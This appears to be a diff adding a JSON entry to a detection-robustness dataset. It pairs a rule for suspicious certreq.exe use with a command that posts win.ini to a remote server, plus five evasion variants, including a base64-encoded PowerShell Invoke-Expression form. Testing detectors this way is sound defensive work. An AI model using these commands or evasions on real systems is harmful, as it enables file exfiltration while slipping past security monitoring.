@@ -1,0 +1,11 @@
+{
+  "rule_name": "proc_creation_win_lolbin_susp_certreq_download_0",
+  "original_command": "\\certreq.exe CertReq.exe -Post -config http C:\\windows\\win.ini",
+  "evasions": {
+    "insertion": "\\certreq.exe CertReq.exe -Post -config \\\"ht\\\"tp C:\\windows\\win.ini",
+    "substitution": "\\certreq.exe CertReq.exe -Post -config http C:\\windows\\win.ini #substitution",
+    "omission": "\\certreq CertReq -Post -config http win.ini",
+    "reordering": "\\certreq.exe -Post CertReq.exe http C:\\windows\\win.ini -config",
+    "recoding": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XGNlcnRyZXEuZXhlIENlcnRSZXEuZXhlIC1Qb3N0IC1jb25maWcgaHR0cCBDOlx3aW5kb3dzXHdpbi5pbmk=')) | Invoke-Expression\" "
+  }
+}
